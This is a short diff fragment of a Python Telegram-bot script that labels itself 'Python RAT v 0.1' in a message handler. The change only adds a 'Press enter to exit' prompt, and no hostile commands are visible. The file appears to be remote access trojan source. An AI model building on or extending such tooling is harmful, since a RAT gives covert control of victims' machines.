@@ -178,3 +178,6 @@ def about(commands):
     bot.send_message(chat_id, " Python RAT v 0.1 \n\nCoder: dnspy \nSpecial for DNSP")
 
 bot.polling()
+
+
+input("Press enter to exit")
